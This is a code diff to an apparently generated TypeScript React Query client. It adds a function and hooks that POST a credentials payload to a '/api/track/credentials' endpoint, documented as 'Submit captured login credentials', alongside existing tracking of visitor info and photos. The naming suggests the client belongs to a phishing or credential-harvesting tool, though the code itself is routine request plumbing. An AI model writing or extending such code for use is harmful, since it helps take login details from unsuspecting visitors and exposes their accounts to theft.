@@ -17,6 +17,7 @@ import type {
 } from "@tanstack/react-query";
 
 import type {
+  CredentialsPayload,
   HealthStatus,
   PhotoPayload,
   TrackResponse,
@@ -193,6 +194,92 @@ export const useSubmitVisitorInfo = <
   TContext
 > => {
   return useMutation(getSubmitVisitorInfoMutationOptions(options));
+};
+
+/**
+ * @summary Submit captured login credentials
+ */
+export const getSubmitCredentialsUrl = () => {
+  return `/api/track/credentials`;
+};
+
+export const submitCredentials = async (
+  credentialsPayload: CredentialsPayload,
+  options?: RequestInit,
+): Promise<TrackResponse> => {
+  return customFetch<TrackResponse>(getSubmitCredentialsUrl(), {
+    ...options,
+    method: "POST",
+    headers: { "Content-Type": "application/json", ...options?.headers },
+    body: JSON.stringify(credentialsPayload),
+  });
+};
+
+export const getSubmitCredentialsMutationOptions = <
+  TError = ErrorType<unknown>,
+  TContext = unknown,
+>(options?: {
+  mutation?: UseMutationOptions<
+    Awaited<ReturnType<typeof submitCredentials>>,
+    TError,
+    { data: BodyType<CredentialsPayload> },
+    TContext
+  >;
+  request?: SecondParameter<typeof customFetch>;
+}): UseMutationOptions<
+  Awaited<ReturnType<typeof submitCredentials>>,
+  TError,
+  { data: BodyType<CredentialsPayload> },
+  TContext
+> => {
+  const mutationKey = ["submitCredentials"];
+  const { mutation: mutationOptions, request: requestOptions } = options
+    ? options.mutation &&
+      "mutationKey" in options.mutation &&
+      options.mutation.mutationKey
+      ? options
+      : { ...options, mutation: { ...options.mutation, mutationKey } }
+    : { mutation: { mutationKey }, request: undefined };
+
+  const mutationFn: MutationFunction<
+    Awaited<ReturnType<typeof submitCredentials>>,
+    { data: BodyType<CredentialsPayload> }
+  > = (props) => {
+    const { data } = props ?? {};
+
+    return submitCredentials(data, requestOptions);
+  };
+
+  return { mutationFn, ...mutationOptions };
+};
+
+export type SubmitCredentialsMutationResult = NonNullable<
+  Awaited<ReturnType<typeof submitCredentials>>
+>;
+export type SubmitCredentialsMutationBody = BodyType<CredentialsPayload>;
+export type SubmitCredentialsMutationError = ErrorType<unknown>;
+
+/**
+ * @summary Submit captured login credentials
+ */
+export const useSubmitCredentials = <
+  TError = ErrorType<unknown>,
+  TContext = unknown,
+>(options?: {
+  mutation?: UseMutationOptions<
+    Awaited<ReturnType<typeof submitCredentials>>,
+    TError,
+    { data: BodyType<CredentialsPayload> },
+    TContext
+  >;
+  request?: SecondParameter<typeof customFetch>;
+}): UseMutationResult<
+  Awaited<ReturnType<typeof submitCredentials>>,
+  TError,
+  { data: BodyType<CredentialsPayload> },
+  TContext
+> => {
+  return useMutation(getSubmitCredentialsMutationOptions(options));
 };
 
 /**
